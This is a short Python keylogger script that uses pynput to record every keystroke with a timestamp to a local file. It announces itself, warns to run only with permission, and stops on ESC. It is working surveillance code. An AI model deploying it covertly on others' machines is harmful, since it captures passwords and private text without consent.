from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

def write_log(key):
    with open(LOG_FILE, "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{timestamp} - {key}\n")

def on_press(key):
    try:
        write_log(key.char)   # normal characters
    except AttributeError:
        write_log(f"[{key}]") # special keys (Enter, Shift, etc.)

def on_release(key):
    # Stop listener with ESC (safety feature)
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

print("Keylogger started (Press ESC to stop)")
print("⚠️ Run only with permission!")

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()
